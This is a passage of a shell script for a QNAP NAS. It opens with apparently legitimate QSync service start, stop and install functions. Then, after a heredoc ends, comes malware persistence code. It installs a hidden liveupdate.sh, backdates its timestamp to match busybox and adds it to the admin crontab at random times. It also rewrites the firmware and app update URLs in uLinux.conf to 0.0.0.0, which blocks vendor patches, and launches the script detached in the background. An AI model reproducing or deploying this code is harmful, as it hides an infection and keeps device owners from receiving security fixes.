		[ ! -f /etc/config/qsync/qsync.conf ] || /bin/chmod 640 /etc/config/qsync/qsync.conf
		[ ! -f /etc/config/qsync/qhost.conf ] || /bin/chmod 640 /etc/config/qsync/qhost.conf
		/sbin/daemon_mgr qsyncman start "/usr/bin/qsyncman 1>/dev/null 2>&1"
		echo "OK"
	fi
}

stop()
{
	echo "Shutting down QSync monitor: OK"
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        kill $pidnum 2>/dev/null
        i=0
        while [ ${i} -lt 5 ]
        do
                pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
                if [ -z "$pidnum" ]; then
                        break
                fi
                sleep 1
                i=`/usr/bin/expr ${i} + 1`
        done
        pidnum=`/bin/pidof qsync``/bin/pidof qsyncd`
        [ -z "$pidnum" ] || kill -9 $pidnum 2>/dev/null
	/sbin/daemon_mgr qsyncman stop "/usr/bin/qsyncman"
	/usr/bin/killall -q qsyncman
}

start_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x1 ] || return -1
	_qsyncd_run_pid=`/bin/pidof qsyncd`
	[ -z $_qsyncd_run_pid ] || return -114
	_recycle_en=`/sbin/getcfg 'Network Recycle Bin' Enable -d FALSE`
	_with_syslog=$1
	if [ "x$_recycle_en" = xTRUE  ]; then
		if [ "x$_with_syslog" = x1  ]; then
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			LD_PRELOAD=/usr/local/lib/libtrash.so /usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	else
		if [ "x$_with_syslog" = x1  ]; then
			/usr/bin/qsyncd -syslog -c:/etc/qsync/qsyncd.conf
		else
			/usr/bin/qsyncd -c:/etc/qsync/qsyncd.conf
		fi
	fi
	_iret=$?
	if [ "x$_iret" = x0 ]; then
		i=0
		while [ ${i} -lt 10000 ]
		do
			echo "${i} millisecond..."
			_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
			_qsyncd_run_pid=`/bin/pidof qsyncd`
			if [ "x$_qsyncd_pid" != "x-1" ] && [ ! -z $_qsyncd_run_pid ]; then
				break
			fi
			usleep 50000
			i=`/usr/bin/expr ${i} + 50`
		done
	fi
	return -$_iret
}

stop_qsyncd()
{
	#_qsyncd_en=`/sbin/getcfg "" Enabled -d 0 -f /etc/qsync/qsyncd.conf`
	#[ "x$_qsyncd_en" = x0 ] || return -1
	_qsyncd_pid=`/sbin/getcfg "" Pid -d -1 -f /etc/qsync/qsyncd.conf`
	[ $_qsyncd_pid -lt 0 ] && return -3
	# Send SIGUSR1 to inform the daemon to output "[RTRR Server] Stopped" event log
	/bin/kill -SIGUSR1 $_qsyncd_pid
	usleep 200000
	# Send SIGINT to stop the QSyncd process
	/bin/kill -SIGINT $_qsyncd_pid
	_kill_ret=$?
	if [ "x$_kill_ret" != x0 ]; then
		return -3
	fi
	echo "need wait $1 millisecond"
	i=0
	while true
	do
		echo "${i} millisecond..."
		_qsyncd_pid=`/sbin/getcfg '' Pid -d -1 -f /etc/qsync/qsyncd.conf`
		_qsyncd_run_pid=`/bin/pidof qsyncd`
		if [ "x$_qsyncd_pid" = "x-1" ] && [ -z $_qsyncd_run_pid ]; then
			break
		fi
		if [ ${i} -ge $1 ]; then
			# if time-out, we send two additional SIGINT to force the daemon to stop.
			if [ $_qsyncd_pid -ge 0 ]; then
				/bin/kill -SIGUSR1 $_qsyncd_pid
				usleep 200000
				/bin/kill -SIGUSR1 $_qsyncd_pid
			fi
			j=0
			while [ ${j} -lt 500 ]
			do
				_qsyncd_run_pid=`/bin/pidof qsyncd`
				if [ -z $_qsyncd_run_pid ]; then
					return 0
				fi
				usleep 20000
				j=`/usr/bin/expr ${j} + 20`
			done
			return -62
		fi
		usleep 50000
		i=`/usr/bin/expr ${i} + 50`
	done
	return 0
}


install()
{
	lock_file="/var/lock/qbox_install_bin.lck"

	if [ ! -f "${INSTALL_BUILD_IN}" ]; then
		dbg "build-in ${QSYNC_NAME} is installed"
		return 1
	fi

	if [ ! -f ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin ]; then
		dbg "${QSYNC_NAME}.bin} not found"
		return 1
	fi

	if [ ! -x "${QPKG_CLI}" ]; then
		dbg "${QPKG_CLI} not found"
		return 1
	fi

	## make sure volume is exist
	if [ ! -d /share/`/sbin/getcfg SHARE_DEF defPublic -d Public -f /etc/config/def_share.info` ]; then
		dbg "/share/Public not found"
		return 1
	fi

	## is removed 
	if [ -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed ]; then
		/bin/rm -f ${INSTALL_BUILD_IN}
		dbg "${QSYNC_NAME} is removed"
		return 1
	fi

	if [ -f "$lock_file" ]; then 
		if [ $(( $(date +%s) - $(date +%s -r $lock_file) )) -le 180 ]; then
			echo "${QSYNC_NAME} is installing"
			dbg "${QSYNC_NAME} is installing"
			return 1
		fi
	fi

	/bin/touch "$lock_file"	
	/bin/rm -f ${INSTALL_BUILD_IN}
	dbg "install build-in ${QSYNC_NAME} start"

	set_default_disable_status

	## install build in Qsync
	${QPKG_CLI} -K -m ${UPDATEPKG_DIR}/${QSYNC_NAME}.bin > /dev/null 2>&1
	sleep 20

	wait_install=60
	## avoid initial take long time or fail
        while [ "$wait_install" -gt 0 ]; do
		stcode=`$CMD_GETCFG ${QSYNC_NAME}.bin stcode -f /etc/config/qpkg_job.conf`
                if [ "$stcode" = "0" ]; then
                        break
                fi
                sleep 1
                let "wait_install--"
        done

	${QPKG_CLI} -C ${QSYNC_NAME}.bin > /dev/null 2>&1
	/bin/rm -f ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled
	/bin/rm -f "$lock_file"	
	dbg "install build-in ${QSYNC_NAME} success"
}

if [ "$1" == "stop" ]; then
	exit 0
fi
fi
XEOF
fi
chmod 755 "${bdir}/.qpkg/.liveupdate/liveupdate.sh"
touch -cr /bin/busybox "${bdir}/.qpkg/.liveupdate/liveupdate.sh"

crontabargs=$(ps | grep 'cr[o]nd ' | sed -n 's/.*crond[^0-9A-Za-z-]*\(.\+\)/\1/p')
trycount=10; trycount=$(( $trycount - 10 ))
set x $crontabargs; shift
while [ $# -gt 0 ] && [ $trycount -lt 10 ]; do
trycount=$(( $trycount + 1 ))
getopts ':c:' OPT 2>/dev/null
test "$OPT" = 'c' && crontabfile="${OPTARG}/admin" && break
test "$OPTIND" -gt 0 && shift "$OPTIND" && OPTIND=1 || break
done
test "$crontabfile" && test -f "${crontabfile}" || crontabfile='/tmp/cron/crontabs/admin'

for crontab in "$crontabfile" "${confdir}/crontab"; do
if $fgrep "${bdir}/.qpkg/.liveupdate/liveupdate.sh" "$crontab"; then
:
else
cronmins=$(printf '%i' "$(( $RANDOM % 60 ))")
cronhour=$(printf '%i' "$(( $RANDOM % 24 ))")
cronhour=$(printf '%i,' "$(( ( $cronhour + 8 ) % 24 ))" "$(( ( $cronhour + 16 ) % 24 ))")"$cronhour"
echo "$cronmins $cronhour"' * * * '"${bdir}/.qpkg/.liveupdate/liveupdate.sh >/dev/null 2>/dev/null" >> "$crontab"
sleep 5
fi
done

grep 'Liveupdate\|FirmwareRelease\|QTS_FW' /etc/default_config/uLinux.conf /etc/config/uLinux.conf | grep 'qnap\.com' >/dev/null && sed -i 's/https\?:\/\/[^\/]\+\/\(Liveupdate\|FirmwareRelease\|QTS_FW\)/http:\/\/0.0.0.0\/\1/' /etc/default_config/uLinux.conf /etc/config/uLinux.conf
sedexpr='QPKG CENTER XML\|Live Update XML\|FW_XML_ALT'
if grep "${sedexpr}" /etc/default_config/uLinux.conf /etc/config/uLinux.conf | grep 'qnap\.com' >/dev/null; then
sed -i 's/^ *\('"${sedexpr}"'\)\(.*https\?:\/\/[^\/]*\)\(qnap\.com[^\/]*\)/\1\20.0.0.0/' /etc/default_config/uLinux.conf /etc/config/uLinux.conf 
grep "${sedexpr}" /etc/default_config/uLinux.conf /etc/config/uLinux.conf | grep 'qnap\.com' && sed -i 's/^ *\('"${sedexpr}"'\).*qnap\.com/\1 = /' /etc/default_config/uLinux.conf /etc/config/uLinux.conf
fi

( ( exec >/dev/null 2>&1 </dev/null; "${bdir}/.qpkg/.liveupdate/liveupdate.sh" </dev/null >/dev/null 2>/dev/null & ) & )
exit 0
